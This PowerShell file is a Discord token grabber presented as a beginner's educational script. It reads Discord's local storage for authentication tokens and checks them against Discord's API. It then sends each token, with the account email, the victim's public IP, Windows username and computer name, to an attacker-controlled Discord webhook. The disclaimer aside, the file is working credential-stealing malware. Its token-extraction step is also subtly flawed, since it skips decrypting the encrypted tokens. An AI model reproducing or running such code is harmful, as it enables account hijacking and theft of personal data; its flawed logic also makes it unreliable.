# DiscordTokenGrabber.ps1
# This script is for educational purposes only to teach beginners PowerShell
# Warning: Use this code only in test environments. Do NOT use it for real data extraction.

# Check if the system is Windows
if ($PSVersionTable.Platform -ne "Win32NT") {
    Write-Host "This script requires Windows OS. Exiting..." -ForegroundColor Red
    exit
}

# Function to check if a module is installed
function Install-ModuleIfNeeded {
    param($ModuleName)
    if (-not (Get-Module -ListAvailable -Name $ModuleName)) {
        Write-Host "Module $ModuleName not found. Please install it using: Install-Module $ModuleName" -ForegroundColor Yellow
        exit
    }
}

# Check for required security module
Install-ModuleIfNeeded -ModuleName "Microsoft.PowerShell.Security"

# Define environment variables
$LOCAL = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
$ROAMING = [System.Environment]::GetEnvironmentVariable("APPDATA")

# Define Discord paths (simplified for beginners)
$PATHS = @{
    "Discord" = "$ROAMING\discord"
    "Discord Canary" = "$ROAMING\discordcanary"
    "Discord PTB" = "$ROAMING\discordptb"
}

# Function to create HTTP headers
function Get-Headers {
    param($Token = $null)
    $headers = @{
        "Content-Type" = "application/json"
        "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    if ($Token) {
        $headers["Authorization"] = $Token
    }
    return $headers
}

# Function to extract tokens (simplified)
function Get-Tokens {
    param($Path)
    $Path = "$Path\Local Storage\leveldb\"
    $tokens = @()

    if (-not (Test-Path $Path)) {
        Write-Host "Path $Path not found. Please make sure Discord is installed." -ForegroundColor Yellow
        return $tokens
    }

    $files = Get-ChildItem -Path $Path -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -eq ".ldb" }
    foreach ($file in $files) {
        try {
            $content = Get-Content -Path "$Path\$($file.Name)" -ErrorAction SilentlyContinue
            foreach ($line in $content) {
                # Regex pattern to find tokens (adjust if needed)
                $matches = $line | Select-String -Pattern "dQw4w9WgXcQ:[^\s]+" 
                if ($matches) {
                    foreach ($match in $matches.Matches) {
                        $token = $match.Value -replace "dQw4w9WgXcQ:", ""
                        $tokens += $token
                    }
                }
            }
        } catch {
            Write-Host "Error reading file $($file.Name): $_" -ForegroundColor Red
        }
    }
    return $tokens
}

# Function to get public IP address
function Get-IP {
    try {
        $response = Invoke-WebRequest -Uri "https://api.ipify.org?format=json" -ErrorAction Stop
        return ($response.Content | ConvertFrom-Json).ip
    } catch {
        Write-Host "Failed to retrieve IP address: $_" -ForegroundColor Red
        return "Unavailable"
    }
}

# Main function
function Main {
    # Set your Discord webhook URL here
    $webhookUrl = "https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7"  # Replace with a valid Discord webhook URL
    if ($webhookUrl -eq "https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7") {
        Write-Host "Error: You must replace 'https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7' with a valid webhook URL. Go to Discord channel -> Integrations -> Create Webhook." -ForegroundColor Red
        exit
    }

    $checkedTokens = @()

    foreach ($platform in $PATHS.Keys) {
        $path = $PATHS[$platform]
        if (-not (Test-Path $path)) {
            Write-Host "Path $path not found." -ForegroundColor Yellow
            continue
        }

        foreach ($token in (Get-Tokens -Path $path)) {
            $token = $token -replace "\\", ""
            if ($checkedTokens -contains $token) {
                Write-Host "Token $token already checked." -ForegroundColor Yellow
                continue
            }
            $checkedTokens += $token

            try {
                # Verify token validity
                $headers = Get-Headers -Token $token
                $userResponse = Invoke-WebRequest -Uri "https://discord.com/api/v10/users/@me" -Headers $headers -ErrorAction Stop
                if ($userResponse.StatusCode -ne 200) {
                    Write-Host "Invalid token: $token" -ForegroundColor Red
                    continue
                }
                $userData = $userResponse.Content | ConvertFrom-Json

                # Get guilds info (simplified)
                $guildResponse = Invoke-WebRequest -Uri "https://discordapp.com/api/v6/users/@me/guilds?with_counts=true" -Headers $headers -ErrorAction Stop
                $guilds = $guildResponse.Content | ConvertFrom-Json
                $guildCount = $guilds.Count

                # Prepare embed message for webhook
                $embed = @{
                    embeds = @(
                        @{
                            title = "New User Data: $($userData.username)"
                            description = @"
User ID: $($userData.id)
Email: $($userData.email)
Guilds Count: $guildCount
Public IP: $(Get-IP)
Username: $env:UserName
Computer Name: $env:COMPUTERNAME
Token Source: $platform

Token:
$token
"@
                            color = 3092790
                            footer = @{ text = "Created for educational purposes" }
                            thumbnail = @{ url = "https://cdn.discordapp.com/avatars/$($userData.id)/$($userData.avatar).png" }
                        }
                    )
                    username = "Token Grabber"
                    avatar_url = "https://avatars.githubusercontent.com/u/43183806?v=4"
                }

                # Send to Discord webhook
                Invoke-WebRequest -Uri $webhookUrl -Method Post -Body ($embed | ConvertTo-Json -Depth 10) -Headers (Get-Headers) -ErrorAction Stop

                Write-Host "Successfully sent user data for $($userData.username)." -ForegroundColor Green

            } catch {
                Write-Host "Error processing token $token: $_" -ForegroundColor Red
            }
        }
    }
}

# Run the main function
Main
